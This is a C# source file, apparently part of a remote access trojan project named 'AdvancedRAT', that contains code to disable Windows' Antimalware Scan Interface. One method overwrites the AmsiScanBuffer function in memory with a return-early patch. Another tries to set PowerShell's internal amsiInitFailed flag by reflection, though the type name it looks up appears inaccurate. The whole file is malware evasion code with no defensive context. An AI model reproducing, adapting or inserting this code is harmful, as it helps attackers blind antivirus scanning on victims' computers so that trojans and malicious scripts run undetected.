using System;
using System.Runtime.InteropServices;

namespace AdvancedRAT.Core.Security
{
    public class AMSEPatch
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static void PatchAMSI()
        {
            try
            {
                IntPtr Library = LoadLibrary("amsi.dll");
                if (Library == IntPtr.Zero)
                {
                    Console.WriteLine("AMSI library not found");
                    return;
                }

                IntPtr AmsiScanBufferAddr = GetProcAddress(Library, "AmsiScanBuffer");
                if (AmsiScanBufferAddr == IntPtr.Zero)
                {
                    Console.WriteLine("AmsiScanBuffer not found");
                    return;
                }

                byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
                uint oldProtect;

                VirtualProtect(AmsiScanBufferAddr, (uint)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                Marshal.Copy(patch, 0, AmsiScanBufferAddr, patch.Length);
                VirtualProtect(AmsiScanBufferAddr, (uint)patch.Length, oldProtect, out oldProtect);

                Console.WriteLine("AMSI patched successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error patching AMSI: {ex.Message}");
            }
        }

        public static void PatchAMSIInitFailed()
        {
            try
            {
                // Alternative method: patch amsiInitFailed variable
                // This requires reflection to access internal AMSI fields
                var amsiUtils = Type.GetType("AntiMalware.AmsiUtils, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                if (amsiUtils != null)
                {
                    var field = amsiUtils.GetField("amsiInitFailed", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                    if (field != null)
                    {
                        field.SetValue(null, true);
                        Console.WriteLine("AMSI Init Failed patched successfully");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error patching AMSI Init Failed: {ex.Message}");
            }
        }
    }
}